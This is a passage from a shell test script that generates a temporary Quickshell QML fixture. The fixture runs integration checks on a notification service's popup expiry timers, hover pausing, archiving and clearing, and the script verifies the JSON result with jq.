  'notifications service keeps no in-memory history models'
)
JS

if ! command -v quickshell >/dev/null 2>&1; then
  pass "quickshell not installed; skipping notification timer integration"
  exit 0
fi

notification_fixture=$(mktemp -d)
trap 'rm -rf "$notification_fixture"' EXIT
python3 - "$ROOT" "$notification_fixture" <<'PY'
from pathlib import Path
import re
import sys

root, fixture = map(Path, sys.argv[1:])
source = (root / 'shell/plugins/notifications/Service.qml').read_text()
start = source.index('  property var popupSchedule:')
end = source.index('  function durationFor(', start)
scheduler = source[start:end]
functions = []
for name in ['isRestoredRow', 'removePopup', 'dismissPopup', 'expirePopup', 'clearPopups', 'withdrawPopup']:
  functions.append(re.search(r'^  function ' + name + r'\([\s\S]*?^  }', source, re.M).group(0))
(fixture / 'NotificationLogic.js').symlink_to(root / 'shell/plugins/notifications/NotificationLogic.js')
(fixture / 'Probe.qml').write_text('import QtQuick\nQtObject { property int value: 41; function increment() { value++ } }\n')
template = '''import QtQuick
import Quickshell
import Quickshell.Io
import "NotificationLogic.js" as NotificationLogic
ShellRoot {
  Item {
    id: service
    property var liveRefs: ({})
    property var restoredPopups: ({})
    property var archives: []
    property var failures: []
    property var ownerA: null
    property var ownerB: null
    property var probe: null
    property int phase: 0
    ListModel { id: popupModel }
    function durationFor(urgency, expireTimeout) { return expireTimeout }
    function archivePopupFileFor(row) { archives.push(NotificationLogic.popupFileName(row)) }
    function check(value, message) { if (!value) failures.push(message) }
    function key() { return NotificationLogic.popupFileName({ timestamp: 2, originalId: 2 }) }
    Component {
      id: hoverOwner
      Item {
        property string expiryKey
        Component.onDestruction: service.setPopupHovered(expiryKey, this, false)
      }
    }
    FileView { id: result; path: Quickshell.env("OMARCHY_QML_TEST_RESULT"); printErrors: false; atomicWrites: true }
    Component.onCompleted: {
      var component = Qt.createComponent("Probe.qml")
      check(component.status === Component.Ready, "probe component loads")
      probe = component.createObject(service)
      component.destroy()
      addPopup({ timestamp: 1, originalId: 1, urgency: 2, expireTimeout: 0 }, true)
      addPopup({ timestamp: 2, originalId: 2, urgency: 1, expireTimeout: 80 }, true)
      ownerA = hoverOwner.createObject(service, { expiryKey: key() })
      ownerB = hoverOwner.createObject(service, { expiryKey: key() })
      setPopupHovered(key(), ownerA, true)
      setPopupHovered(key(), ownerB, true)
      addPopup({ timestamp: 3, originalId: 3, urgency: 0, expireTimeout: 15 }, true)
      phaseTimer.start()
    }
    Timer {
      id: refreshTimer
      interval: 30
      onTriggered: service.resetPopupLifetime({ timestamp: 2, originalId: 2, urgency: 1, expireTimeout: 120 })
    }
    Timer {
      id: phaseTimer
      interval: 100
      onTriggered: {
        if (service.phase === 0) {
          service.check(service.popupNow() >= 50, "ElapsedTimer measures elapsed milliseconds")
          service.check(popupModel.count === 2, "nearest expiry removes only its identity after index shifts")
          service.resetPopupLifetime({ timestamp: 2, originalId: 2, urgency: 1, expireTimeout: 80 })
          service.ownerA.destroy()
        } else if (service.phase === 1) {
          service.check(popupModel.count === 2, "destroying one hovered output leaves the other pause active")
          service.ownerB.destroy()
          refreshTimer.start()
        } else if (service.phase === 2) {
          service.check(popupModel.count === 2, "replacement restarts the timer and invalidates the original deadline")
        } else {
          service.check(popupModel.count === 1 && popupModel.get(0).originalId === 1, "destroying the last hover owner resumes expiry while critical alerts remain")
          service.check(!popupExpiryTimer.running, "no timer runs when only a critical popup remains")
          service.check(service.archives.length === 2, "each expired row is archived exactly once")
          service.probe.increment()
          service.check(service.probe.value === 42, "destroying a Component preserves its instantiated object")
          service.clearPopups()
          service.check(popupModel.count === 0 && service.popupSchedule.next(service.popupNow()) === null, "clear removes every timer identity")
          result.setText(JSON.stringify({ ok: service.failures.length === 0, failures: service.failures }))
          Qt.callLater(function() { Qt.quit() })
          return
        }
        service.phase++
        phaseTimer.start()
      }
    }
__SCHEDULER__
__FUNCTIONS__
  }
}
'''
(fixture / 'shell.qml').write_text(template.replace('__SCHEDULER__', scheduler).replace('__FUNCTIONS__', '\n'.join(functions)))
PY

if ! QT_QPA_PLATFORM=offscreen OMARCHY_QML_TEST_RESULT="$notification_fixture/result.json" \
    timeout 10 quickshell -p "$notification_fixture" --no-color > "$notification_fixture/quickshell.log" 2>&1; then
  cat "$notification_fixture/quickshell.log" >&2
  fail "notification timer integration runs"
fi
if ! jq -e '.ok == true' "$notification_fixture/result.json" >/dev/null; then
  cat "$notification_fixture/result.json" "$notification_fixture/quickshell.log" >&2
  fail "notification timer integration checks pass"
fi
pass "notification timer integration checks pass with real ElapsedTimer, ListModel, output destruction and timer callbacks"
